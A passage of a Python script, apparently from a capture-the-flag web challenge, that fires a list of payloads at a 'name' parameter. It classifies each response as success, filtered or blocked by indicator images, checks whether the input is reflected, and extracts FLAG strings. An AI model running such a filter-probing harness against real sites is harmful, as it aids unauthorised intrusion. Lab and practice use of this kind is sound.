for i, payload in enumerate(payloads, 1):
    try:
        # Send request with payload
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        # Analyze response
        status = response.status_code
        length = len(response.text)
        
        # Check for indicator images
        has_success = "success_star.png" in response.text
        has_error = "error_star.png" in response.text
        has_blocked = "new_star.png" in response.text
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        
        # Determine result
        result = "UNKNOWN"
        if has_success:
            result = "SUCCESS ✓"
            successful_payloads.append((payload, response.text))
        elif has_error:
            result = "FILTERED"
            filtered_payloads.append(payload)
        elif has_blocked:
            result = "BLOCKED"
            blocked_payloads.append(payload)
        elif status != 200:
            result = f"ERROR ({status})"
            anomalies.append((payload, status, length))
        
        # Print results for successful or anomalous payloads
        if has_success or flag_match or (status != 200) or (not has_success and not has_error and not has_blocked):
            print(f"\n[{i}/{len(payloads)}] {result}")
            print(f"Payload: {payload}")
            print(f"Status: {status} | Length: {length}B")
            print(f"Success: {has_success} | Error: {has_error} | Blocked: {has_blocked}")
            
            if flag_match:
                print(f"[!] FLAG FOUND: {flag_match.group()}")
                print(f"Full response:\n{response.text}")
            
            # Check if payload is reflected in response
            if payload in response.text or payload.replace('<', '&lt;').replace('>', '&gt;') in response.text:
                print(f"[+] Payload reflected in response")
            
            # Print response preview for successful payloads
            if has_success:
                print(f"[!] SUCCESS - Response preview:")
                print(response.text[:500])
                if len(response.text) > 500:
                    print(f"... ({len(response.text) - 500} more characters)")
        
        # Group similar failures silently
        elif has_blocked or has_error:
            pass  # Count but don't print each one
            
    except requests.exceptions.Timeout:
        print(f"\n[{i}/{len(payloads)}] TIMEOUT")
        print(f"Payload: {payload}")
    except Exception as e:
        print(f"\n[{i}/{len(payloads)}] EXCEPTION")
        print(f"Payload: {payload}")
        print(f"Error: {str(e)}")

# Summary
print("\n" + "=" * 100)
print("[SUMMARY]")
print(f"Total payloads tested: {len(payloads)}")
print(f"Successful (success_star.png): {len(successful_payloads)}")
print(f"Filtered (error_star.png): {len(filtered_payloads)}")
print(f"Blocked (new_star.png): {len(blocked_payloads)}")
print(f"Anomalies: {len(anomalies)}")

if successful_payloads:
    print("\n[!] SUCCESSFUL PAYLOADS:")
    for payload, response in successful_payloads:
        print(f"\nPayload: {payload}")
        flag_match = re.search(r'FLAG\{[^}]+\}', response)
        if flag_match:
            print(f"[!] FLAG: {flag_match.group()}")
        print(f"Full response:\n{response}")

if anomalies:
    print("\n[!] ANOMALIES (non-200 status or unusual responses):")
    for payload, status, length in anomalies:
